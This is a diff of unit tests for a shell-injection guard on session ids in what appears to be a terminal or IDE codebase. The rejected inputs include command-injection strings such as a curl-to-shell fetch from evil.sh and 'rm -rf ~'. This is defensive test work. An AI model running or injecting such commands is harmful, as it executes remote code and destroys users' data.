@@ -12,6 +12,7 @@ import {
   sessionHomeIdFor,
   shouldPreserveMissingSessionOnRestore,
   shouldWarnMissingResume,
+  isShellSafeSessionId,
 } from './resume-command'
 import { TERMINAL_CREATE_TIMEOUT_MS } from '@navide/terminal'
 
@@ -426,5 +427,38 @@ describe('resumeCommandPattern', () => {
     expect(looksLikeResume('muse', 'muse')).toBe(false)
     expect(looksLikeResume('muse', 'muse resume')).toBe(false)
     expect(looksLikeResume('muse', "muse exec 'run the tests'")).toBe(false)
+  })
+})
+
+describe('isShellSafeSessionId — the renderer half of the shape guard', () => {
+  // The id is interpolated into a command run as [shell, '-ilc', cmd], so
+  // anything that could split into more words is code, not an argument. The
+  // backend refuses these before broadcasting; this is the second layer.
+  it('refuses ids that would be read as shell syntax', () => {
+    for (const evil of [
+      'abc; curl evil.sh | sh',
+      'abc && rm -rf ~',
+      'abc`id`',
+      'abc$(id)',
+      'abc | tee /tmp/x',
+      'abc\nid',
+      "abc 'quoted'",
+      'abc > /tmp/x',
+      '',
+    ]) {
+      expect(isShellSafeSessionId(evil), JSON.stringify(evil)).toBe(false)
+    }
+  })
+
+  it("accepts every vendor's real id format", () => {
+    for (const real of [
+      '0072be2a-32ab-45ff-880d-df10d2a8e0b8', // claude / cursor / qwen / pi
+      'ses_8f3a21c0', // opencode / kilo
+      'session_0072be2a-32ab-45ff-880d-df10d2a8e0b8', // kimi
+      '12ab34cd', // grok
+      'sessions/2026/09/rollout-01.jsonl', // codex: a path
+    ]) {
+      expect(isShellSafeSessionId(real), real).toBe(true)
+    }
   })
 })
